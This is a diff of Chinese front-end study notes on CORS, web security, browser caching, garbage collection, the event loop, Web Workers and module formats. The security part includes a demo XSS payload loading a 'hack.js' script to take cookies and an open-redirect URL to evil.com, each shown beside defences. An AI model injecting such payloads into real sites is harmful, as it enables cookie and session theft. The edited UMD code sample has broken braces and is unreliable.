@@ -113,7 +113,8 @@ RAF 的执行步伐跟着系统的绘制频率走。它能保证回调函数在�
 
 
 # 解决跨域：(https://juejin.cn/post/7075261878997352462)
-1：Node中间件代理(两次跨域) （前端先访问已设置Cors的后端1,再让后端1去访问后端2获取数据到后端1，后端1再把数据传到前端）             document.domain + iframe   location.hash + iframe
+1：Node中间件代理(两次跨域)(前端先访问已设置Cors的后端1,再让后端1去访问后端2获取数据到后端1,后端1再把数据传到前端)           
+   document.domain + iframe  location.hash + iframe
 2：Proxy代理跨域
 3：WebSocket解决跨域
 4：jsonp解决跨域(就是在script标签上面加载资源)
@@ -152,30 +153,61 @@ https://www.eggjs.org/zh-CN/core/security
 https://github.com/ljianshu/Blog/issues/56
 
 1:XSS 攻击的本质是将用户数据当成了 HTML 代码一部分来执行，从而混淆原本的语义，产生新的语义。
-模拟获取cookie-----http://localhost:3000/?from=<script src="http://localhost:4000/hack.js">
-XSS 的原理是恶意攻击者往 Web 页面里插入恶意可执行网页脚本代码，当用户浏览该页之时，嵌入其中 Web 里面的脚本代码会被执行，
-从而可以达到攻击者盗取用户信息或其他侵犯用户安全隐私的目的。
+  模拟获取cookie-----http://localhost:3000/?from=<script src="http://localhost:4000/hack.js">
+  XSS 的原理是恶意攻击者往 Web 页面里插入恶意可执行网页脚本代码，当用户浏览该页之时，嵌入其中 Web 里面的脚本代码会被执行，
+  从而可以达到攻击者盗取用户信息或其他侵犯用户安全隐私的目的。
+  持久型 XSS
+防御:
+  设置 HTTP Header 中的 Content-Security-Policy
+  对数据进行严格的输出编码:如HTML元素的编码,JS编码,CSS编码,URL编码等等
+  输入验证:比如一些常见的数字、URL、电话号码、邮箱地址等等做校验判断
+  转义字符，引号、尖括号、斜杠进行转义  str = str.replace(/&/g, '&amp;') str = str.replace(/</g, '&lt;')
+  HttpOnly Cookie
+  
+2:CSRF 英文全称是 Cross-site request forgery,所以又称为“跨站请求伪造”,是指黑客引诱用户打开黑客的网站,在黑客的网站中,利用用户的登录状态发起的跨站请求。简单来讲,「CSRF 攻击就是黑客利用了用户的登录状态，并通过第三方的站点来做一些坏事。
 
-2:CSRF 英文全称是 Cross-site request forgery,所以又称为“跨站请求伪造”,是指黑客引诱用户打开黑客的网站,在黑客的网站中,利用用户的登录状态发起的跨站请求。简单来讲,「CSRF 攻击就是黑客利用了用户的登录状态，并通过第三方的站点来做一些坏事。」
+防御:
+  Cookie 设置 SameSite 属性。该属性表示 Cookie 不随着跨域请求发送
+  Referer Check 来监控CSRF攻击的发生
+  Anti CSRF Token  服务端发送一个token过来 客户端请求时携带
 
-# 措施：
-对数据进行严格的输出编码：如HTML元素的编码,JS编码,CSS编码,URL编码等等
-输入验证：比如一些常见的数字、URL、电话号码、邮箱地址等等做校验判断
-验证码
-token
+3:URL跳转漏洞
+  http://www.wooyun.org/login.php?jumpto=http://www.evil.com
+
+4:SQL注入
+  访问用户信息  user表被删除
+
+5:DOS和DDOS攻击
+  在DoS攻击中，攻击者通过伪造ACK数据包，希望Server重传某些数据包，Server根据TCP重转机制，进行数据重传。攻击者利用TCP协议缺陷，通过发送大量的半连接请求，耗费CPU和内存资源
+  DDoS的攻击策略侧重于通过很多“僵尸主机”，向受害主机发送大量看似合法的网络包，从而造成网络阻塞或服务器资源耗尽而导致拒绝服务
+
+6: https中间人攻击
 
 
-#! 浏览器缓存 :::::::::::: https://github.com/ljianshu/Blog/issues/23
+#! 浏览器缓存 :::::::::::: https://github.com/ljianshu/Blog/issues/23 
 ../note/sublime/assets/浏览器缓存.png
+
 强缓存：
-当浏览器去请求某个文件的时候，服务端就在respone header里面对该文件做了缓存配置。缓存的时间、缓存类型都由服务端控制
-相关的header: Expires Cache-Control  Cache-Control优先级高于Expires
+当浏览器去请求某个文件的时候,服务端就在respone header里面对该文件做了缓存配置。缓存的时间、缓存类型都由服务端控制
+相关的header: 'Expires' 具体时间过期 'Cache-Control' xxx秒过期  Cache-Control优先级高于Expires
+    内存缓存:快速读取 实效性  ---js和图片
+    硬盘缓存:速度较慢 读取复杂 -----css文件
 
 协商缓存：
 发请求-->看资源是否过期-->过期-->请求服务器-->服务器对比资源是否真的过期-->没过期-->返回304状态码-->客户端用缓存的老资源。
-相关的header: 1:Last-Modified和If-Modified-Since  2:ETag和If-None-Match
+相关的header: 1: 服务器响应请求时 'Last-Modified' 和 客户端再次发起该请求时 'If-Modified-Since'  
+             2: 优先考虑Etag'ETag'是服务器计算的hash值 和If-None-Match------Etag值放到request header里的If-None-Match里
 
-# 缓存的机制
+'Service Worker'
+Service Worker是运行在浏览器背后的独立线程,一般可以用来实现缓存功能。使用 Service Worker的话,传输协议必须为 HTTPS。
+因为Service Worker中涉及到请求拦截,所以必须使用HTTPS协议来保障安全。
+Service Worker 的缓存与浏览器其他内建的缓存机制不同，它可以让我们自由控制缓存哪些文件、如何匹配缓存、如何读取缓存，并且缓存是持续性的。
+Service Worker 实现缓存功能一般分为三个步骤：首先需要先注册 Service Worker,然后监听到 install 事件以后就可以缓存需要的文件，
+那么在下次用户访问的时候就可以通过拦截请求的方式查询是否存在缓存，存在缓存的话就可以直接读取缓存文件，否则就去请求数据。
+当 Service Worker 没有命中缓存的时候，我们需要去调用 fetch 函数获取数据。也就是说，如果我们没有在 Service Worker 命中缓存的话，会根据缓存查找优先级去查找数据。但是不管我们是从 Memory Cache 中还是从网络请求中获取的数据，浏览器都会显示我们是从 Service Worker 中获取的内容。
+
+# 缓存的机制 https://heyingye.github.io/2018/04/16/%E5%BD%BB%E5%BA%95%E7%90%86%E8%A7%A3%E6%B5%8F%E8%A7%88%E5%99%A8%E7%9A%84%E7%BC%93%E5%AD%98%E6%9C%BA%E5%88%B6/
+
 强制缓存优先于协商缓存进行，若强制缓存(Expires和Cache-Control)生效则直接使用缓存，
 若不生效则进行协商缓存(Last-Modified / If-Modified-Since和Etag / If-None-Match)
 协商缓存由服务器决定是否使用缓存，若协商缓存失效，那么代表该请求的缓存失效，重新获取请求结果，再存入浏览器缓存中；生效则返回304，继续使用缓存
@@ -187,20 +219,52 @@ token
 之所以拉取缓存会出现200、304两种不同的状态码,取决于浏览器是否有向服务器发起验证请求。 
 只有向服务器发起验证请求并确认缓存未被更新,才会返回304状态码。
 
+拓展:
+Service Worker
+
 # 注意⚠️
 在我们配置缓存时一定要切记,浏览器在处理用户请求时,如果命中强缓存,浏览器会直接拉取本地缓存,
 不会与服务器发生任何通信,也就是说,如果我们在服务器端更新了文件,并不会被浏览器得知,就无法替换失效的缓存。
 所以我们在构建阶段,需要为我们的静态资源添加md5 hash后缀,避免资源更新而引起的前后端文件无法同步的问题
 
+浏览器的缓存机制指的是通过在一段时间内保留已接收到的 web 资源的一个副本，如果在资源的有效时间内，发起了对这个资源的再一次请求，那么浏览器会直接使用缓存的副本，而不是向服务器发起请求。
+使用 web 缓存可以有效地提高页面的打开速度，减少不必要的网络带宽的消耗。
+web 资源的缓存策略一般由服务器来指定，可以分为两种，分别是强缓存策略和协商缓存策略。
+使用强缓存策略时，如果缓存资源有效，则直接使用缓存资源，不必再向服务器发起请求。强缓存策略可以通过两种方式来设置，分别是 http 头信息中的 Expires 属性和 Cache-Control 属性。
+服务器通过在响应头中添加 Expires 属性，来指定资源的过期时间。在过期时间以内，该资源可以被缓存使用，不必再向服务器发送请求。
+这个时间是一个绝对时间，它是服务器的时间，因此可能存在这样的问题，就是客户端的时间和服务器端的时间不一致，或者用户可以对客户端时间进行修改的情况，这样就可能会影响缓存命中的结果。
+Expires 是 http1.0 中的方式，因为它的一些缺点，在 http 1.1 中提出了一个新的头部属性就是 Cache-Control 属性，它提供了对资源的缓存的更精确的控制。
+它有很多不同的值，常用的比如我们可以通过设置 max-age 来指定资源能够被缓存的时间的大小，这是一个相对的时间，
+它会根据这个时间的大小和资源第一次请求时的时间来计算出资源过期的时间，因此相对于 Expires 来说，这种方式更加有效一些。
+常用的还有比如 private ，用来规定资源只能被客户端缓存，不能够代理服务器所缓存。还有如 
+no-store:用来指定资源不能够被缓存。
+no-cache:代表该资源能够被缓存,但是立即失效,每次都需要向服务器发起请求。
+一般来说只需要设置其中一种方式就可以实现强缓存策略，当两种方式一起使用时，Cache-Control 的优先级要高于 Expires 。
+使用协商缓存策略时，会先向服务器发送一个请求，如果资源没有发生修改，则返回一个 304 状态，让浏览器使用本地的缓存副本。如果资源发生了修改，则返回修改后的资源。
+协商缓存也可以通过两种方式来设置，分别是 http 头信息中的 Etag 和 Last-Modified 属性。
+服务器通过在响应头中添加 Last-Modified 属性来指出资源最后一次修改的时间，当浏览器下一次发起请求时，会在请求头中添加一个 If-Modified-Since 的属性，属性值为上一次资源返回时的 Last-Modified 的值。
+当请求发送到服务器后服务器会通过这个属性来和资源的最后一次的修改时间来进行比较，以此来判断资源是否做了修改。
+如果资源没有修改，那么返回 304 状态，让客户端使用本地的缓存。如果资源已经被修改了，则返回修改后的资源。使用这种方法有一个缺点，
+就是 Last-Modified 标注的最后修改时间只能精确到秒级，如果某些文件在 1 秒钟以内，被修改多次的话，那么文件已将改变了但是 Last-Modified 却没有改变，这样会造成缓存命中的不准确。
+因为 Last-Modified 的这种可能发生的不准确性，http 中提供了另外一种方式，那就是 Etag 属性。
+服务器在返回资源的时候，在头信息中添加了 Etag 属性，这个属性是资源生成的唯一标识符，当资源发生改变的时候，这个值也会发生改变。在下一次资源请求时，浏览器会在请求头中添加一个 If-None-Match 属性，这个属性的值就是上次返回的资源的 Etag 的值。
+服务接收到请求后会根据这个值来和资源当前的 Etag 的值来进行比较，以此来判断资源是否发生改变，是否需要返回资源。通过这种方式，比 Last-Modified 的方式更加精确。
+当 Last-Modified 和 Etag 属性同时出现的时候，Etag 的优先级更高。使用协商缓存的时候，服务器需要考虑负载平衡的问题，因此多个服务器上资源的 Last-Modified 应该保持一致，因为每个服务器上 Etag 的值都不一样，因此在考虑负载平衡时，最好不要设置 Etag 属性。
+强缓存策略和协商缓存策略在缓存命中时都会直接使用本地的缓存副本，区别只在于协商缓存会向服务器发送一次请求。它们缓存不命中时，都会向服务器发送请求来获取资源。
+在实际的缓存机制中，强缓存策略和协商缓存策略是一起合作使用的。浏览器首先会根据请求的信息判断，强缓存是否命中，如果命中则直接使用资源。
+如果不命中则根据头信息向服务器发起请求，使用协商缓存，如果协商缓存命中的话，则服务器不返回资源，浏览器直接使用本地资源的副本，如果协商缓存不命中，则浏览器返回最新的资源给浏览器。
+
+
+
 
 # 回收机制::::::::::::::::::::::::::
 垃圾回收机制的原理:是找到不再继续使用的变量,也就是程序自己本身都访问不了的变量,释放其内存。垃圾回收器会按照固定的时间间隔(或代码中预定的收集时间)，周期性地执行这一操作;
 
-1. 标记-清除(Mark and Sweep)：垃圾回收器会从根对象（如全局变量、活动函数的局部变量等）开始，标记所有可以访问到的对象。然后，扫描整个堆内存，
+1.'标记-清除(Mark and Sweep)':垃圾回收器会从根对象（如全局变量、活动函数的局部变量等）开始，标记所有可以访问到的对象。然后，扫描整个堆内存，
 将未被标记的对象判定为垃圾对象，将其释放并回收内存。
-2. 引用计数(Reference Counting)：垃圾回收器为每个对象维护一个引用计数器，记录对象被引用的次数。当计数器为零时，表示对象不再被引用，可以被回收。
+2.'引用计数(Reference Counting)':垃圾回收器为每个对象维护一个引用计数器，记录对象被引用的次数。当计数器为零时，表示对象不再被引用，可以被回收。
 然而，引用计数机制难以处理循环引用的情况，因为循环引用的对象之间的引用计数永远不会变为零。
-3. 分代收集(Generational collection)—— 对象被分成两组：“新的”和“旧的”。在典型的代码中，许多对象的生命周期都很短：
+3.'分代收集(Generational collection)':对象被分成两组：“新的”和“旧的”。在典型的代码中，许多对象的生命周期都很短：
 它们出现、完成它们的工作并很快死去，因此在这种情况下跟踪新对象并将其从内存中清除是有意义的。
 那些长期存活的对象会变得“老旧”，并且被检查的频次也会降低。
 
@@ -219,18 +283,14 @@ Javascript 会找出不再使用的变量,不再使用意味着这个变量生�
   2.当多个函数共享词法环境时，会导致词法环境膨胀。从而触发程序自身无法访问且垃圾回收也无法回收。
 4:DOM泄漏---游离DOM引用
 浏览器中DOM和js采用的是不一样的引擎,DOM采用的是渲染引擎,而js采用的是v8引擎
-5:遗忘的Map、Set对象 ------使用了 WeakMap 以及 WeakSet 即为弱引用
+5:遗忘的Map、Set对象 ------可以使用WeakMap以及 WeakSet解决 即为弱引用
 6:js对象循环引用
 
 
-
-
-
 #! 浏览器兼容性问题 ：：：：：：：：：：：
-
 @vitejs/plugin-legacy
 
-1:通过rollup构建了面向低版本的资源 
+1:通过rollup构建了面向低版本的资源
 rollup cjs esm umd
 2:在html入口增加了nomodule的兼容
 
@@ -350,8 +410,10 @@ js只能是单线程-------------假定JavaScript同时有两个线程,一个线
 进程：是 CPU 资源分配的最小单位可以理解成正在执行的应用程序，
 线程：是 CPU 调度的最小单位，可以理解成我们应用程序中的代码的执行器。而他们的关系可想而知，
 线程是跑在进程里面的,`一个进程里面可能有一个或者多个线程，而一个线程，只能隶属于一个进程`。
-GUI 渲染线程：负责渲染浏览器界面,解析 HTML,CSS,构建 DOM 树和 RenderObject 树,布局和绘制等。
-JS 引擎线程：javascript 引擎,也称为 JS 内核,负责处理 Javascript 脚本程序（v8引擎）
+
+GUI 渲染线程:负责渲染浏览器界面,解析 HTML,CSS,构建 DOM 树和 RenderObject 树,布局和绘制等。
+JS 引擎线程:javascript 引擎,也称为 JS 内核,负责处理 Javascript 脚本程序(v8引擎)
+HTTP 请求线程:负责执行异步请求一类的函数的线程，如： Promise,axios,ajax等
 
 这个引擎(V8)主要由两部分组成:
 内存堆：这是内存分配发生的地方
@@ -381,21 +443,19 @@ GUI渲染线程与JS线程是互斥的。所以JS脚本执行和浏览器布局�
 # 事件循环的具体流程如下：
 从宏任务队列中，按照 入队顺序 ，找到第一个执行的宏任务，放入调用栈，开始执行；
 执行完 该宏任务下所有同步任务后，即调用栈清空后，该宏任务被推出宏任务队列，然后微任务队列开始按照入队顺序，依次执行其中的微任务，
-直至微任务队列清空为止 ；当微任务队列清空后，一个事件循环结束；
+直至微任务队列清空为止 ；当微任务队列清空后，一个事件循环结束；进行GUI渲染
 接着从宏任务队列中，找到下一个执行的宏任务，开始第二个事件循环，直至宏任务队列清空为止。
 
-## Promise.resolve().then(() => { }).then(() => { }); 会把连续的then依次按顺序放入本次微任务队列中去
+## Promise.resolve().then(() => { }).then(() => { }); 会把连续的then依次按顺序放入本次微任务队列中去 (先进先出)
 
 # 在线调试地址：https://www.jsv9000.app/
-macro-task(宏任务)：包括整体代码script,setTimeout,setInterval
-micro-task(微任务)：Promise, process.nextTick(Node环境)
+macro-task(宏任务)：script,setTimeout,setInterval
+micro-task(微任务)：Promise, process.nextTick(Node环境) MutationObserver
 
 # async await
 异步代码 同步执行
 async函数表示函数里面可能会有异步方法,await后面跟一个表达式,async方法执行时,遇到await会立即执行表达式
 然后把表达式后面的代码放到微任务队列里，让出执行栈让同步代码先执行
-
-1. Promise（微任务） 2. MutationObserver（微任务） 3. setImmediate（宏任务） 4. setTimeout（宏任务）
 
 🌰 async await 案例
 let res = function() {
@@ -416,11 +476,16 @@ new Promise((resolve, reject) => {
 });
 console.log(7);  step 6
 
-🌰promise 与 then 分开 案例
 
-; web worker！！！！！！！！！！！！！！！！！！！！！ demo https://github.com/xy-sea/blog/tree/main/web-worker
-; 因为js是单线程 当js有大量计算时，会造成 UI 阻塞，出现界面卡顿、掉帧等情况，严重时会出现页面卡死的情况，俗称假死
-1：开启多线程,并行计算
+# web worker！！！！！！！！！！！！！！！！！！！！！ demo https://github.com/xy-sea/blog/tree/main/web-worker
+  因为js是单线程 当js有大量计算时,会造成 UI 阻塞，出现界面卡顿、掉帧等情况,严重时会出现页面卡死的情况，俗称假死.
+
+#Web Worker 一文彻底了解Web Worker，十万、百万条数据都是弟弟🔥
+https://juejin.cn/post/7137728629986820126#heading-9
+https://github.com/xy-sea/blog/tree/dev/web-worker
+
+
+1:开启多线程,并行计算
 2:web worker除了单纯进行计算外，还可以结合离屏canvas进行绘图，提升绘图的渲染性能和使用体验
 
 ; Web Worker的限制
@@ -430,11 +495,16 @@ console.log(7);  step 6
 4、每个线程运行在完全独立的环境中，需要通过postMessage、 message事件机制来实现的线程之间的通信
 
 
-# iframe的缺点
+# iframe的优缺点
 1.会产生很多页面，不容易管理。
 3.代码复杂，无法被一些搜索引擎索引到，这一点很关键，现在的搜索引擎爬虫还不能很好的处理iframe中的内容，所以使用iframe会不利于搜索引擎优化。
 5.iframe框架页面会增加服务器的http请求，对于大型网站是不可取的。
 
+iframe应用
+1:纯前端的utf8和gbk编码互转。比如在utf8页面需要生成一个gbk的encodeURIComponent字符串,
+  可以通过页面加载一个gbk的iframe,然后主页面与子页面通信的实现转换
+2:跨域通信
+3:sandbox沙箱隔离
 
 # 浏览器搜索引擎的原理
 1网页抓取（Crawling）：搜索引擎使用称为"蜘蛛"或"爬虫"的程序来抓取互联网上的网页。这些爬虫按照预定的算法和规则，从一个页面到另一个页面，通过链接不断地抓取网页内容。
@@ -482,7 +552,7 @@ console.log(7);  step 6
 
 
 
-#! 前端模块化：：：：：：：：：：：：：：：：：：：：：：：：：：：：：：：：
+#! 前端模块化：：：：：：：：：：： https://github.com/ljianshu/Blog/issues/48
 window----IIFE-------AMD-------CMD--------CommonJs-------UMD(同时兼容了amd cmd common.js的规范)---------ESM
 
 异步模块定义规范(AMD)制定了定义模块的规则,这样模块和模块的依赖可以被异步加载。
@@ -505,21 +575,20 @@ var testUtils = function () {
     }
 }()
 
-
-：AMD（RequireJS）
+2:AMD(RequireJS)
  依赖必须一开始就写好
 define(['./utils'], function(utils) {
   utils.request();
 });
 
-// CMD----跟requireJS解决同样问题，只是运行机制不同。   `CMD规范整合了CommonJS和AMD规范的特点`
+3:CMD----跟requireJS解决同样问题,只是运行机制不同。`CMD规范整合了CommonJS和AMD规范的特点`
 define(function(require) {
   依赖可以就近书写
   var utils = require('./utils');
   utils.request();
 });
 
-：CommonJS
+4:CommonJS
 随着 node 诞生，服务器端的模块规范 CommonJS 被创建出来。
 var config = require('./config');
 const {
@@ -530,9 +599,8 @@ const {
 module.exports = NAME
 exports = NAME
 
-：UMD
+5:UMD
 amd cmd 通常只能在浏览器中使用, commonjs只能在服务端(Node)**环境下使用
-
 (function (root, factory) {
     if (typeof exports === 'object' && typeof module === 'object')
         // commonjs
@@ -546,13 +614,11 @@ amd cmd 通常只能在浏览器中使用, commonjs只能在服务端(Node)**环
     else
         // 全局对象, 浏览器中是 window
         root['math'] = factory()
-})(this, function() {
-    return { add: function(left, right) { return left + right; } }
+})(this, function(){
+    return { add: function(left, right) { return left + right; 
+  })
 
-
-
-ES6 module:(目前的浏览器还没有全部兼容 需要使用bable进行处理)
-
+6:ES6 module:(目前的浏览器还没有全部兼容 需要使用bable进行处理)
 ES6 模块的设计思想是尽量的静态化，使得编译时就能确定模块的依赖关系，
 以及输入和输出的变量。CommonJS 和 AMD 模块,都只能在运行时确定这些东西。比如,CommonJS 模块就是对象，输入时必须查找对象属性
 
@@ -566,7 +632,7 @@ ES6 module 使用import导入模块接口
 import { api as myApi } from './config.js';
 import()实现按需加载
 
-##  对比差异
+## 对比差异
 // Named export/import  具名导出/导入:
 export { sum }   
 import { sum } from 'sum'  
@@ -592,6 +658,7 @@ require的模块路径可以动态指定,支持传入一个表达式,我们甚�
 因此,在CommonJS模块被执行前,并没有办法确定明确的依赖关系,模块的导入、导出发生在代码的运行阶段。
 
 对于CommonJS来说获取的是一份导出值的拷贝,而在ES6 Module中则是值的动态映射,并且这个映射是只读的。
+
 
 # 什么是COS?
 COS,全称对象存储(Cloud Object Storage),COS是一种存储海量文件的分布式存储服务,
